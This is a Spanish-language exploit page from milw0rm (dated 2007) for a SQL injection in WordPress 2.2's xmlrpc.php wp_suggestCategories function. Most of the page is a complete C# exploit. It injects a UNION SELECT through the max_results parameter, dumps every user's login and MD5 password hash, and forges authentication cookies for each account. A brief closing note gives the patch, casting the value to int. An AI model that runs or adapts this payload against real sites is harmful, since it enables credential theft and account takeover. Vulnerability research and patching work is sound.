<html><head><title>Wordpress 2.2 (xmlrpc.php) Remote SQL Injection Exploit</title></head><pre>/*
El error, bastante tonto por cierto, se encuentra en la función wp_suggestCategories, en el archivo xmlrpc.php:
 
function wp_suggestCategories($args) {
        global $wpdb;

        $this-&gt;escape($args);

        $blog_id                             = (int) $args[0];
        $username                            = $args[1];
        $password                            = $args[2];
        $category                            = $args[3];
        $max_results            	     = $args[4];

        if(!$this-&gt;login_pass_ok($username, $password)) {
                return($this-&gt;error);
        }

        // Only set a limit if one was provided.
        $limit = &quot;&quot;;
        if(!empty($max_results)) {
                $limit = &quot;LIMIT {$max_results}&quot;;
        }

        $category_suggestions = $wpdb-&gt;get_results(&quot;
                SELECT cat_ID category_id,
                        cat_name category_name
                FROM {$wpdb-&gt;categories}
                WHERE cat_name LIKE '{$category}%'
                {$limit}
        &quot;);

        return($category_suggestions);
}

Como se puede observar en la porción de código, no se hace una conversión a entero del valor de $max_results, por lo que es posible enviar valores del tipo 0 UNION ALL SELECT user_login, user_pass FROM wp_users. Para que un atacante logre su objetivo, es necesario que éste tenga una cuenta de usuario válida (una cuenta de tipo suscriber basta y sobra) en el sitio víctima.

Preparé un pequeño exploit (Creditos: Alex) que devuelve la lista de usuarios con sus respectivas contraseñas en MD5, además también incluye las cookies de autenticación para cada usuario.

Credits: Alex de la Concha

code c sharp:
*/
 
using System;
using System.Net;
using System.Text;
using System.Xml;
using System.Text.RegularExpressions;
using System.Security.Cryptography;

class Program
{
    static void Main(string[] args)
    {
        string targetUrl = &quot;http://localhost/wp/&quot;;
        string login = &quot;alex&quot;;
        string password = &quot;1234&quot;;

        string data = @&quot;&lt;methodCall&gt;
  &lt;methodName&gt;wp.suggestCategories&lt;/methodName&gt;
  &lt;params&gt;
    &lt;param&gt;&lt;value&gt;1&lt;/value&gt;&lt;/param&gt;
    &lt;param&gt;&lt;value&gt;{0}&lt;/value&gt;&lt;/param&gt;
    &lt;param&gt;&lt;value&gt;{1}&lt;/value&gt;&lt;/param&gt;
    &lt;param&gt;&lt;value&gt;1&lt;/value&gt;&lt;/param&gt;
    &lt;param&gt;&lt;value&gt;0 UNION ALL SELECT user_login, user_pass FROM {2}users&lt;/value&gt;&lt;/param&gt;
  &lt;/params&gt;
&lt;/methodCall&gt;&quot;;

        string cookieHash = GetCookieHash(targetUrl);

        using (WebClient request = new WebClient())
        {
            /* Probar con el prefijo por omisión */
            string response = request.UploadString(targetUrl + &quot;xmlrpc.php&quot;,
                string.Format(data, login, password, &quot;wp_svn_&quot;));

            /* Se hace una nueva petición si la consulta anterior falla */
            Match match = Regex.Match(response, @&quot;FROM\s+(.*?)categories\s+&quot;);
            if (match.Success)
            {
                response = request.UploadString(targetUrl + &quot;xmlrpc.php &quot;,
                    string.Format(data, login, password, match.Groups[1].Value));
            }

            try
            {
                XmlDocument doc = new XmlDocument();
                doc.LoadXml(response);

                XmlNodeList nodes = doc.SelectNodes(&quot;//struct/member/value&quot;);

                if (nodes != null &amp;&amp; doc.SelectSingleNode(&quot;/methodResponse/fault&quot;) == null)
                {
                    string user, pass;
                    /* Mostrar lista de:
                     * Usuario     md5(contraseña)
                     * Cookie de Autenticación
                     *
                     */
                    for (int i = 0; i &lt; nodes.Count / 2 + 1; i += 2)
                    {
                        user = nodes.Item(i).InnerText;
                        pass = nodes.Item(i + 1).InnerText;
                        Console.WriteLine(&quot;Usuario: {0}\tMD5(Contraseña): {1}&quot;,
                            user,
                            pass);
                        Console.WriteLine(&quot;Cookie: wordpressuser_{0}={1};wordpresspass_{0}={2}\n&quot;,
                            cookieHash,
                            user,
                            MD5(pass));
                    }
                }
                else
                {
                    Console.WriteLine(&quot;Error:\n{0}&quot;, response);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(&quot;Error:\n&quot; + ex.ToString());
            }
        }
    }

    private static string GetCookieHash(string targetUrl)
    {
        WebRequest request = WebRequest.Create(targetUrl + &quot;wp-login.php?action=logout&quot;);
        request.Method = &quot;HEAD&quot;;
        (request as HttpWebRequest).AllowAutoRedirect = false;

        WebResponse response = request.GetResponse();
        if (response != null)
        {
            Match match = Regex.Match(response.Headers[&quot;Set-Cookie&quot;],
                    @&quot;wordpress[a-z]+_([a-z\d]{32})&quot;,
                    RegexOptions.IgnoreCase);

            if (match.Success)
                return match.Groups[1].Value;
        }
        return string.Empty;
    }
    public static string MD5(string password)
    {
        MD5CryptoServiceProvider x = new MD5CryptoServiceProvider();
        byte[] bs = Encoding.UTF8.GetBytes(password);
        bs = x.ComputeHash(bs);
        StringBuilder s = new StringBuilder();
        foreach (byte b in bs)
        {
            s.Append(b.ToString(&quot;x2&quot;).ToLower());
        }
        return s.ToString();
    }
}
/*
Para corregir este problema, mientras liberan actualizaciones para Wordpress 2.2, es editar el archivo xmlrpc.php y cambiar la línea $max_results = $args[4]; de la función wp_suggestCategories por $max_results = (int) $args[4]; o en su defecto bloquear el acceso a xmlrpc.php.

o malo esque tienes que tener una cuenta aunque sea con los minimos permisos para obtener los demas nombres de users con sus respectivos MD5.

    static void Main(string[] args)
    {
        string targetUrl = &quot;http://localhost/wp/&quot;;
        string login = &quot;alex&quot;;
        string password = &quot;1234&quot;;

hay seria la ruta donde esta colocado el wordpress 2.2, tu nombre de usuario y tu password.
Ya se creo un zip con los archivos vulnerables ya reparados [ xmlrpc.php, wp-admin/post-new.php, wp-admin/page-new.php , wp-admin/users-edit.php. ]

:: [Slappter] ::
*/

# milw0rm.com [2007-06-06]</pre></html>